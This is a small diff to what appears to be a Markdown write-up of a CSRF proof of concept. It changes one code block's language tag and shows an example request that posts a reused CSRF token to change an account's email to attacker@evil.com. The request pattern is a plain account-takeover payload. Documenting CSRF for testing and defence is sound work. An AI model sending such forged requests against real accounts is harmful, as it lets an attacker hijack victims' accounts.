@@ -42,7 +42,7 @@ The CSRF token is:
 -   Reuse it in CSRF PoC
 
 ### Endpoint :
-```json
+```html
 POST /account/update-email 
 csrf_token=123456&email=attacker@evil.com
 ```
